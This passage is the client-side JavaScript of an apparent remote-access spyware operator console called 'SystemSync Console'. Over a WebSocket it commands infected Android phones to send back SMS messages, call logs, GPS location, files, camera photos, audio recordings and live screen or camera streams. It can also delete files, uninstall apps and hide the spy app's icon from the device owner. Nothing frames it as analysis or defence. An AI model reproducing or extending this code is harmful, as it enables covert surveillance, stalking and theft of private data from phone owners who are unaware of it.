        if (audioMediaRecorder && audioMediaRecorder.state === 'recording') {
            audioMediaRecorder.stop();
            audioMediaRecorder = null;
        }
    }

    function sendCommand(command, params = {}) {
        if (!currentDeviceId) {
            panel.innerHTML = `<div style="color:#d32f2f;">⚠ Please select a device first</div>`;
            return;
        }

        if (!ws || ws.readyState !== WebSocket.OPEN) {
            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. Click reconnect.</div>`;
            return;
        }

        const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
        const payload = {
            type: 'COMMAND',
            command: command,
            requestId: requestId,
            deviceId: currentDeviceId,
            params: params,
            timestamp: Date.now()
        };
        ws.send(JSON.stringify(payload));
        panel.innerHTML = `📤 Command sent to ${devices.get(currentDeviceId)?.name || 'device'}: ${command}`;
        pendingCommand = command;
        setTimeout(() => { if (pendingCommand === command) pendingCommand = null; }, 10000);
    }

    function sendPlainText(msg) {
        if (!currentDeviceId) {
            panel.innerHTML = `<div style="color:#d32f2f;">⚠ Please select a device first</div>`;
            return;
        }

        if (!ws || ws.readyState !== WebSocket.OPEN) {
            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. Click reconnect.</div>`;
            return;
        }

        ws.send(msg);
        panel.innerHTML = `📤 Plain text sent: ${msg}`;
    }

    function handleDeviceRegistration(data) {
        const deviceId = data.deviceId;
        const deviceName = data.name || data.manufacturer + ' ' + data.model;

        devices.set(deviceId, {
            id: deviceId,
            name: deviceName,
            manufacturer: data.manufacturer,
            model: data.model,
            androidVersion: data.androidVersion,
            lastSeen: Date.now()
        });

        updateDeviceSelector();
        showNotification(`New device connected: ${deviceName}`);

        if (devices.size === 1) {
            currentDeviceId = deviceId;
            document.getElementById('deviceSelector').value = deviceId;
            showWelcomeMessage(false);
        }
    }

    function updateDeviceSelector() {
        const selector = document.getElementById('deviceSelector');
        const countSpan = document.getElementById('deviceCount');

        const currentValue = selector.value;

        selector.innerHTML = '<option value="">Select Device</option>';

        devices.forEach((device, id) => {
            const option = document.createElement('option');
            option.value = id;
            option.textContent = device.name;
            if (id === currentDeviceId) {
                option.selected = true;
            }
            selector.appendChild(option);
        });

        countSpan.textContent = devices.size;

        if (currentValue && devices.has(currentValue)) {
            selector.value = currentValue;
        }
    }

    function switchDevice(deviceId) {
        if (!deviceId) {
            currentDeviceId = null;
            showWelcomeMessage(true);
            return;
        }

        currentDeviceId = deviceId;
        showWelcomeMessage(false);

        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({
                type: 'SWITCH_DEVICE',
                deviceId: deviceId
            }));
        }

        showNotification(`Switched to ${devices.get(deviceId)?.name}`);
    }

    function showWelcomeMessage(show) {
        const welcomeMsg = document.getElementById('welcomeMessage');
        if (welcomeMsg) {
            if (show && devices.size === 0) {
                welcomeMsg.style.display = 'block';
            } else {
                welcomeMsg.style.display = 'none';
            }
        }
    }

    function updateBatteryInfo(level, charging) {
        currentBatteryLevel = level;
        currentBatteryStatus = charging ? 'charging' : 'discharging';

        const batteryDiv = document.getElementById('batteryInfo');
        const levelDiv = document.querySelector('.battery-level');
        const percentSpan = document.querySelector('.battery-percent');
        const iconDiv = document.querySelector('.battery-icon');

        if (level >= 0) {
            batteryDiv.style.display = 'flex';
            levelDiv.style.width = level + '%';

            if (level <= 15) levelDiv.style.background = '#f44336';
            else if (level <= 30) levelDiv.style.background = '#ff9800';
            else levelDiv.style.background = '#4caf50';

            if (charging) {
                iconDiv.classList.add('charging');
            } else {
                iconDiv.classList.remove('charging');
            }

            percentSpan.textContent = level + '%';
        }
    }

    function getInstalledApps() {
        sendCommand('GET_INSTALLED_APPS');
    }

    function displayInstalledApps(apps) {
        let html = '<h3>📱 Installed Apps</h3>';
        html += '<div style="max-height: 500px; overflow-y: auto;">';

        apps.forEach(app => {
            html += `
                <div class="app-item">
                    <div class="app-icon">📱</div>
                    <div class="app-details">
                        <div class="app-name">${app.appName}</div>
                        <div class="app-package">${app.packageName}</div>
                    </div>
                    <div class="app-actions">
                        <button class="open" onclick="openApp('${app.packageName}')">Open</button>
                        <button class="uninstall" onclick="uninstallApp('${app.packageName}')">Uninstall</button>
                    </div>
                </div>
            `;
        });

        html += '</div>';
        panel.innerHTML = html;
    }

    function uninstallApp(packageName) {
        if (confirm(`Uninstall ${packageName}?`)) {
            sendCommand('UNINSTALL_APP', { package: packageName });
        }
    }

    function openApp(packageName) {
        sendCommand('OPEN_APP', { package: packageName });
    }

    function deleteFile(path) {
        if (confirm(`Delete ${path}?`)) {
            sendCommand('DELETE_FILE', { path: path });
        }
    }

    // Helper to parse data if it's a string
    function parseDataField(data) {
        if (typeof data === 'string') {
            try {
                return JSON.parse(data);
            } catch (e) {
                console.error('Failed to parse data string', e);
                return null;
            }
        }
        return data;
    }

    function handleJSON(json) {
        console.log('handleJSON:', json.type, json);

        if (json.deviceId && json.deviceId !== currentDeviceId) {
            console.log('Message from non-selected device:', json.deviceId);
            if (!devices.has(json.deviceId)) {
                handleDeviceRegistration({
                    deviceId: json.deviceId,
                    name: json.deviceName || 'Unknown Device'
                });
            }
            return;
        }

        switch (json.type) {
            case 'DEVICE_REGISTRATION':
                handleDeviceRegistration(json);
                break;

            case 'DEVICE_LIST':
                devices.clear();
                if (Array.isArray(json.devices)) {
                    json.devices.forEach(device => {
                        devices.set(device.deviceId, device);
                    });
                }
                updateDeviceSelector();
                if (devices.size > 0 && !currentDeviceId) {
                    const firstId = devices.keys().next().value;
                    switchDevice(firstId);
                }
                break;

            case 'DEVICE_INFO':
                if (json.batteryLevel !== undefined) {
                    updateBatteryInfo(json.batteryLevel, json.batteryCharging || false);
                }
                break;

            case 'INSTALLED_APPS':
                displayInstalledApps(json.data);
                break;

            case 'FILE_DELETED':
                showNotification('File deleted');
                sendCommand('LIST_FILES', { path: currentPath });
                break;

            case 'DEVICE_REGISTERED':
                showNotification('Device registered successfully');
                break;

            case 'SMS_DATA':
                dataType = 'sms';
                currentData = parseDataField(json.data);
                renderTable();
                break;

            case 'CALL_LOGS':
                dataType = 'call';
                currentData = parseDataField(json.data);
                renderTable();
                break;

            case 'FILE_LIST':
                dataType = 'file';
                currentData = parseDataField(json.data);
                renderFiles();
                break;

            case 'LOCATION_UPDATE':
                renderMap(parseDataField(json.data));
                break;

            case 'CAMERA_IMAGE':
                displayCapturedImage(json.data);
                break;

            case 'AUDIO_RECORDING':
                showAudio(json.data);
                break;

            case 'ERROR':
                panel.innerHTML = `<div style="color:#d32f2f;">Error: ${json.error}</div>`;
                break;

            case 'APP_HIDDEN':
                iconHidden = true;
                document.getElementById('iconBtn').innerText = 'Show Icon';
                showNotification('App icon hidden');
                break;

            case 'APP_SHOWN':
                iconHidden = false;
                document.getElementById('iconBtn').innerText = 'Hide Icon';
                showNotification('App icon shown');
                break;

            case 'SCREEN_SHARE_STARTED':
                screenActive = true;
                document.getElementById('screenBtn').innerText = 'Stop Screen';
                showNotification('Screen share started');
                break;

            case 'SCREEN_SHARE_STOPPED':
                screenActive = false;
                document.getElementById('screenBtn').innerText = 'Start Screen';
                if (screenPC) { screenPC.close(); screenPC = null; }
                showNotification('Screen share stopped');
                break;

            default:
                console.log('Unhandled JSON type:', json.type);
                if (pendingCommand === 'LIST_FILES' && Array.isArray(json)) {
                    dataType = 'file';
                    currentData = json;
                    renderFiles();
                } else if (pendingCommand === 'GET_SMS' && Array.isArray(json)) {
                    dataType = 'sms';
                    currentData = json;
                    renderTable();
                } else if (pendingCommand === 'GET_CALL_LOGS' && Array.isArray(json)) {
                    dataType = 'call';
                    currentData = json;
                    renderTable();
                } else if (pendingCommand === 'GET_LOCATION' && json.lat && json.lon) {
                    renderMap(json);
                }
                break;
        }

        pendingCommand = null;
    }

    function handlePlainText(msg) {
        if (msg.startsWith("STATUS:")) {
            setStatus(msg.substring(7));
        } else if (msg.startsWith("LOC_DATA:")) {
            try {
                const data = JSON.parse(msg.substring(9));
                renderMap(data);
            } catch (err) { console.error(err); }
        } else if (msg.startsWith("FILE_LIST:")) {
            try {
                currentData = JSON.parse(msg.substring(10));
                dataType = 'file';
                renderFiles();
            } catch (err) { console.error(err); }
        } else if (msg.startsWith("SMS_DATA:")) {
            try {
                currentData = JSON.parse(msg.substring(9));
                dataType = 'sms';
                renderTable();
            } catch (err) { console.error(err); }
        } else if (msg.startsWith("CALL_DATA:")) {
            try {
                currentData = JSON.parse(msg.substring(10));
                dataType = 'call';
                renderTable();
            } catch (err) { console.error(err); }
        } else if (msg.startsWith("CAMERA_IMAGE:")) {
            const base64 = msg.substring(13);
            displayCapturedImage(base64);
        } else if (msg.startsWith("AUDIO_RECORDING:")) {
            showAudio(msg.substring(16));
        } else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
            screenActive = true;
            document.getElementById('screenBtn').innerText = 'Stop Screen';
            showNotification('Screen share started');
        } else if (msg.startsWith("SCREEN_SHARE_STOPPED")) {
            screenActive = false;
            document.getElementById('screenBtn').innerText = 'Start Screen';
            if (screenPC) { screenPC.close(); screenPC = null; }
            showNotification('Screen share stopped');
        } else if (msg.startsWith("APP_HIDDEN")) {
            iconHidden = true;
            document.getElementById('iconBtn').innerText = 'Show Icon';
            showNotification('App icon hidden');
        } else if (msg.startsWith("APP_SHOWN")) {
            iconHidden = false;
            document.getElementById('iconBtn').innerText = 'Hide Icon';
            showNotification('App icon shown');
        } else if (msg.startsWith("VIBRATE_DONE")) {
            showNotification('Vibration done');
        } else if (msg.startsWith("ERROR:")) {
            panel.innerHTML = `<div style="color:#d32f2f;">Error: ${msg.substring(6)}</div>`;
        } else if (msg.startsWith("FILE_DATA:")) {
            const base64 = msg.substring(10);
            downloadBase64(base64, 'downloaded_file');
        } else if (msg.startsWith('[') || msg.startsWith('{')) {
            try {
                const parsed = JSON.parse(msg);
                handleJSON(parsed);
            } catch (err) {
                console.error('Failed to parse JSON in plain text:', err);
            }
        } else {
            console.log('Unhandled plain text:', msg);
        }
    }

    function setStatus(s) {
        statusEl.innerText = s;
        if (s === 'ONLINE') {
            statusEl.classList.remove('offline');
            statusEl.style.background = '#e8f5e9';
            statusEl.style.color = '#2e7d32';
        } else {
            statusEl.classList.add('offline');
            statusEl.style.background = '#ffebee';
            statusEl.style.color = '#c62828';
        }
    }

    function toggleCameraPanel(panelId) {
        const clickPanel = document.getElementById('clickCameraPanel');
        const livePanel = document.getElementById('liveCameraPanel');
        if (panelId === 'click') {
            clickPanel.classList.toggle('show');
            livePanel.classList.remove('show');
        } else {
            livePanel.classList.toggle('show');
            clickPanel.classList.remove('show');
        }
    }

    function capturePicture() {
        const camera = document.querySelector('input[name="clickCameraSelect"]:checked').value;
        const useFlash = document.getElementById('clickFlashCheckbox').checked;
        sendCommand('CAMERA_SNAPSHOT', { camera, flash: useFlash });
    }

    function displayCapturedImage(base64) {
        panel.innerHTML = `
            <img src="data:image/jpeg;base64,${base64}" style="max-width:100%;">
            <div style="margin-top:10px; text-align:center;">
                <button onclick="downloadBase64('${base64}', 'snapshot_${Date.now()}.jpeg')">💾 SAVE IMAGE</button>
            </div>
        `;
    }

    function takeSnapshot() {
        const video = document.getElementById('liveCamVideo');
        if (!video || !video.videoWidth) {
            alert('No live video or video not ready');
            return;
        }
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob(blob => {
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `snapshot_${Date.now()}.png`;
            a.click();
            URL.revokeObjectURL(url);
        }, 'image/png');
    }

    function toggleRecording() {
        const video = document.getElementById('liveCamVideo');
        if (!video || !video.srcObject) {
            alert('No live stream');
            return;
        }
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
            document.getElementById('recordBtn').innerText = 'Record Video';
        } else {
            recordedChunks = [];
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const stream = video.srcObject;

            if (video.videoWidth === 0) {
                video.onloadedmetadata = () => startCanvasRecording(video, canvas, ctx, stream);
            } else {
                startCanvasRecording(video, canvas, ctx, stream);
            }
        }
    }

    function startCanvasRecording(video, canvas, ctx, originalStream) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        function drawVideoFrame() {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            requestAnimationFrame(drawVideoFrame);
        }
        drawVideoFrame();

        const canvasStream = canvas.captureStream(30);
        originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));

        mediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
        mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
        mediaRecorder.onstop = () => {
            const blob = new Blob(recordedChunks, { type: 'video/webm' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `recording_${Date.now()}.webm`;
            a.click();
            URL.revokeObjectURL(url);
            canvasStream.getTracks().forEach(track => track.stop());
        };
        mediaRecorder.start();
        document.getElementById('recordBtn').innerText = 'Stop Recording';
    }

    function toggleAppIcon() {
        if (iconHidden) sendPlainText('showApp');
        else sendPlainText('hideApp');
    }

    function showAudio(base64) {
        panel.innerHTML = `
            <audio controls src="data:audio/3gp;base64,${base64}"></audio>
            <button onclick="downloadBase64('${base64}', 'recording.3gp')">Download</button>
        `;
    }

    function downloadBase64(b64, filename) {
        const a = document.createElement('a');
        a.href = 'data:application/octet-stream;base64,' + b64;
        a.download = filename;
        a.click();
    }

    function renderMap(loc) {
        if (!loc || typeof loc.lat !== 'number' || typeof loc.lon !== 'number') {
            panel.innerHTML = '<p>Invalid location data</p>';
            return;
        }

        panel.innerHTML = '<div id="map" style="position:relative;"></div>';
        const mapDiv = document.getElementById('map');

        const infoDiv = document.createElement('div');
        infoDiv.className = 'map-info';
        infoDiv.innerHTML = `
            <div class="coord">📍 ${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}</div>
            <div>🎯 Accuracy: ${loc.accuracy ? loc.accuracy.toFixed(1) : '?'} m</div>
            <div>📡 Provider: ${loc.provider || 'unknown'}</div>
            <div class="addr">🌍 Loading address...</div>
        `;
        mapDiv.appendChild(infoDiv);

        if (mapInstance) mapInstance.remove();
        mapInstance = L.map(mapDiv).setView([loc.lat, loc.lon], 18);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
        L.circle([loc.lat, loc.lon], { radius: loc.accuracy || 10, color: '#1976ff' }).addTo(mapInstance);

        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${loc.lat}&lon=${loc.lon}&zoom=18&addressdetails=1`, {
            headers: { 'User-Agent': 'SystemSync-Console/1.0' }
        })
        .then(response => response.json())
        .then(data => {
            const address = data.display_name || 'Address not found';
            infoDiv.querySelector('.addr').innerHTML = `🌍 ${address}`;
        })
        .catch(err => {
            console.error('Geocoding error:', err);
            infoDiv.querySelector('.addr').innerHTML = '🌍 Address unavailable';
        });
    }

    function renderTable() {
        if (!currentData || currentData.length === 0) {
            panel.innerHTML = '<p>No data</p>';
            return;
        }

        let headers = [], rows = [];
        if (dataType === 'sms') {
            headers = ['Type', 'Number', 'Message', 'Date'];
            rows = currentData.map(item => [item.type, item.number, item.body, item.date]);
        } else if (dataType === 'call') {
            headers = ['Type', 'Number', 'Name', 'Date', 'Duration'];
            rows = currentData.map(item => [
                item.type,
                item.number,
                item.name || '',
                item.date,
                item.duration + 's'
            ]);
        } else {
            panel.innerHTML = '<p>Unknown data type</p>';
            return;
        }

        const pageSize = 20;
        const totalPages = Math.ceil(rows.length / pageSize);
        const start = currentPage * pageSize;
        const pageRows = rows.slice(start, start + pageSize);

        let html = '<table><thead><tr>';
        headers.forEach(h => html += `<th>${h}</th>`);
        html += '</tr></thead><tbody>';

        pageRows.forEach(r => {
            html += '<tr>';
            r.forEach(cell => html += `<td>${cell}</td>`);
            html += '</tr>';
        });
        html += '</tbody></table>';

        if (totalPages > 1) {
            html += '<div class="pagination">';
            for (let i = 0; i < totalPages; i++) {
                html += `<button class="page-btn" onclick="gotoPage(${i})">${i+1}</button>`;
            }
            html += '</div>';
        }

        panel.innerHTML = html;
    }

    function gotoPage(p) {
        currentPage = p;
        renderTable();
    }

    function renderFiles() {
        let html = `
            <div class="file-manager">
                <div class="file-toolbar-sticky">
                    <div class="file-toolbar">
                        <button onclick="navigateUp()">⬆ Up</button>
                        <span class="file-path">${currentPath}</span>
                        <div class="download-selected">
                            <button onclick="downloadSelected()">Download Selected (${selectedFiles.length})</button>
                        </div>
                    </div>
                </div>
        `;

        if (!currentData || currentData.length === 0) {
            html += '<p style="padding:20px;">No files found.</p>';
        } else {
            const folders = currentData.filter(item => item.isDir);
            const files = currentData.filter(item => !item.isDir);
            selectedFiles = [];

            html += `
                <div class="file-panes">
                    <div class="folder-pane">
                        <div class="pane-title">Folders</div>
                        <div id="folderList">
            `;

            folders.forEach(f => {
                html += `
                    <div class="folder-item" onclick="handleFolderClick('${f.path}')">
                        <span class="folder-icon">📁</span>
                        <span class="folder-name">${f.name}</span>
                    </div>
                `;
            });

            html += `
                        </div>
                    </div>
                    <div class="file-pane">
                        <div class="pane-title">Files</div>
                        <div id="fileList">
            `;

            files.forEach(f => {
                const path = f.path;
                const name = f.name;
                const size = formatBytes(f.size);
                html += `
                    <div class="file-item">
                        <input type="checkbox" class="file-checkbox" data-path="${path}" onchange="updateSelected(this)">
                        <span class="file-icon">📄</span>
                        <span class="file-name">${name}</span>
                        <span class="file-size">${size}</span>
                        <div class="file-actions">
                            <button class="delete" onclick="deleteFile('${path}')" title="Delete">🗑</button>
                        </div>
                    </div>
                `;
            });

            html += `
                        </div>
                    </div>
                </div>
            `;
        }

        html += '</div>';
        panel.innerHTML = html;
    }

    function handleFolderClick(path) {
        currentPath = path;
        sendCommand('LIST_FILES', { path: path });
    }

    function navigateUp() {
        if (currentPath === 'root' || currentPath === '') return;
        let parts = currentPath.split('/');
        parts.pop();
        let parent = parts.join('/');
        if (parent === '') parent = 'root';
        currentPath = parent;
        sendCommand('LIST_FILES', { path: parent });
    }

    function updateSelected(checkbox) {
        const path = checkbox.dataset.path;
        if (checkbox.checked) {
            if (!selectedFiles.includes(path)) selectedFiles.push(path);
        } else {
            selectedFiles = selectedFiles.filter(p => p !== path);
        }
        const downloadBtn = document.querySelector('.download-selected button');
        if (downloadBtn) {
            downloadBtn.innerText = `Download Selected (${selectedFiles.length})`;
        }
    }

    function downloadSelected() {
        if (selectedFiles.length === 0) {
            alert('No files selected');
            return;
        }
        selectedFiles.forEach(path => {
            sendPlainText('dl ' + path);
        });
    }

    function formatBytes(b) {
        if (b === 0) return '0 B';
        const k = 1024, sizes = ['B','KB','MB','GB'];
        const i = Math.floor(Math.log(b)/Math.log(k));
        return (b/Math.pow(k,i)).toFixed(1) + ' ' + sizes[i];
    }

    function showNotification(text) {
        const orig = statusEl.innerText;
        statusEl.innerText = text;
        setTimeout(() => { statusEl.innerText = orig; }, 2000);
    }

    function handleIncomingMessage(msg) {
        try {
            const json = JSON.parse(msg);
            if (json.type === 'SIGNALING') {
                handleSignalingMessage(json.data);
            } else {
                handleJSON(json);
            }
        } catch (e) {
            handlePlainText(msg);
        }
    }

    function connectWebSocket() {
        if (ws) {
            ws.close();
        }
        setStatus('CONNECTING');
        ws = new WebSocket(WS_URL);
        ws.onopen = () => {
            console.log('WebSocket connected');
            ws.send('I_AM_WEB');
            setStatus('ONLINE');

            const welcomeMsg = document.getElementById('welcomeMessage');
            if (welcomeMsg) {
                welcomeMsg.innerHTML = `
                    <h2>👋 Welcome to SystemSync Console</h2>
                    <p>Waiting for devices to connect...</p>
                    <p>When a device installs the app, it will appear in the dropdown menu above.</p>
                `;
                welcomeMsg.style.display = 'block';
            }

            ws.send(JSON.stringify({ type: 'GET_DEVICES' }));

            if (window.deviceListInterval) clearInterval(window.deviceListInterval);
            window.deviceListInterval = setInterval(() => {
                if (ws && ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({ type: 'GET_DEVICES' }));
                }
            }, 30000);
        };
        ws.onmessage = (e) => {
            console.log('RAW message:', e.data);
            handleIncomingMessage(e.data);
        };
        ws.onclose = () => {
            console.log('WebSocket closed');
            setStatus('OFFLINE');
            panel.innerHTML = '🔌 WebSocket disconnected. Click reconnect.';
            ws = null;
            if (window.deviceListInterval) {
                clearInterval(window.deviceListInterval);
            }
        };
        ws.onerror = (err) => {
            console.error('WebSocket error:', err);
            setStatus('ERROR');
        };
    }

    document.querySelectorAll('input[name="clickCameraSelect"]').forEach(radio => {
        radio.addEventListener('change', function() {
            const flashCheckbox = document.getElementById('clickFlashCheckbox');
            const flashOption = document.getElementById('flashOption');
            if (this.value === 'front') {
                flashOption.style.display = 'none';
                flashCheckbox.checked = false;
            } else {
                flashOption.style.display = '';
            }
        });
    });

    window.addEventListener('load', () => {
        const selected = document.querySelector('input[name="clickCameraSelect"]:checked');
        if (selected && selected.value === 'front') {
            document.getElementById('flashOption').style.display = 'none';
        }
    });

    modalSnapBtn.addEventListener('click', snapScreenFromModal);
    modalRecordBtn.addEventListener('click', toggleScreenRecording);
    modalFullscreenBtn.addEventListener('click', toggleFullscreen);
    modalCloseBtn.addEventListener('click', closeScreenModal);

    modalVideo.addEventListener("loadedmetadata", () => {});

    function toggleSidebar() {
        const sidebar = document.getElementById('sidebar');
        const overlay = document.getElementById('sidebarOverlay');
        sidebar.classList.toggle('show');
        overlay.classList.toggle('show');
    }

    window.addEventListener('resize', function() {
        if (window.innerWidth > 768) {
            document.getElementById('sidebar').classList.remove('show');
            document.getElementById('sidebarOverlay').classList.remove('show');
        }
    });

    window.toggleScreen = toggleScreen;
    window.toggleCameraPanel = toggleCameraPanel;
    window.capturePicture = capturePicture;
    window.startLiveStream = startLiveStream;
    window.stopLiveStream = stopLiveStream;
    window.toggleLiveAudio = toggleLiveAudio;
    window.stopLiveAudio = stopLiveAudio;
    window.sendCommand = sendCommand;
    window.sendPlainText = sendPlainText;
    window.toggleAppIcon = toggleAppIcon;
    window.takeSnapshot = takeSnapshot;
    window.toggleRecording = toggleRecording;
    window.downloadBase64 = downloadBase64;
    window.gotoPage = gotoPage;
    window.handleFolderClick = handleFolderClick;
    window.navigateUp = navigateUp;
    window.updateSelected = updateSelected;
    window.downloadSelected = downloadSelected;
    window.connectWebSocket = connectWebSocket;
    window.snapScreen = snapScreenFromModal;
    window.getInstalledApps = getInstalledApps;
    window.uninstallApp = uninstallApp;
    window.openApp = openApp;
    window.deleteFile = deleteFile;
    window.switchDevice = switchDevice;
    window.toggleSidebar = toggleSidebar;
    window.toggleAudioRecording = toggleAudioRecording;

    document.getElementById('screenShareBtn').addEventListener('click', toggleScreen);

    connectWebSocket();
</script>
